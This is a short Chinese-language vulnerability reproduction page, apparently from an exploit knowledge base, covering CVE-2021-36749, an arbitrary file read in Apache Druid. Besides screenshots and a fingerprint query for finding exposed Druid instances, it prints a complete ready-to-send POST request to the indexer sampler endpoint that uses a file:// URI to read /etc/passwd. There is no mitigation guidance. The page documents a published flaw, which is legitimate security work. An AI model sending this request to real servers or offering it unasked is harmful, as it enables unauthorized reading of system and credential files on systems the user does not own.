---
title: Apache Druid LoadData 任意文件读取漏洞 CVE-2021-36749 
---

# Apache Druid LoadData 任意文件读取漏洞 CVE-2021-36749

## 漏洞描述

由于用户指定 HTTP InputSource 没有做出限制，可以通过将文件 URL 传递给 HTTP InputSource 来绕过应用程序级别的限制。攻击者可利用该漏洞在未授权情况下，构造恶意请求执行文件读取，最终造成服务器敏感性信息泄露。

## 漏洞影响

<a-checkbox checked>Apache Druid</a-checkbox></br>

## 网络测绘

<a-checkbox checked>
<a-button href="https://github.com/">title="Apache Druid"</a-button>
</a-checkbox>

## 漏洞复现

主页面

![img](../../../.vuepress/public/img/1635581825740-fb87d406-6cf5-4c7f-b757-66e83d957346.png)

复现过程

![img](../../../.vuepress/public/img/1635581875371-557354af-d294-49ab-9483-79180aadfe65.png)

![img](../../../.vuepress/public/img/1635581900223-41408c4c-3b5c-4b66-b726-532835d0254d.png)

请求包为

```php
POST /druid/indexer/v1/sampler?for=connect
Accept: application/json, text/plain, */*

{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","inputSource":{"type":"http","uris":["file:///etc/passwd"]},"inputFormat":{"type":"regex","pattern":"(.*)","columns":["raw"]}},"dataSchema":{"dataSource":"sample","timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"1970-01-01T00:00:00Z"},"dimensionsSpec":{}},"tuningConfig":{"type":"index"}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
```

![img](../../../.vuepress/public/img/1635582099772-ea2fb699-82d9-4df1-aea9-9ed1f9068ae3.png)